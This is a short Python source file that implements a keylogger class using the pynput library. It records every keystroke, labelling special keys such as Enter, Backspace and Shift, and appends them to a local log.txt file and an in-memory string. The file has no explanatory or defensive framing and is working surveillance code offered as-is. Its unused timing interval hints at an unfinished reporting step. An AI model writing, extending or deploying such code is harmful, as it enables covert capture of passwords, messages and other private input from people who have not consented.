import pynput.keyboard

class Keylog:
    def __init__(self, interval_time):
        self.log = ""
        self.interval = interval_time
    

    def append_to_key(self, string):
        self.log = self.log + string
         

    def process_key_strike(self, key):
        # global log
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " ENTER "
            elif key == key.backspace:
                current_key = " BACKSPACE "
            elif key == key.shift:
                current_key = " SHIFT "
            elif key == key.tab:
                current_key = " TAB "
            elif key == key.alt:
                current_key = " ALT "
            else:
                current_key =" " + str(key) + " "

        #text saving in file
        with open("log.txt", 'a') as f:
            f.write(current_key)

        self.append_to_key(current_key)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_strike)
        with keyboard_listener:
            keyboard_listener.join()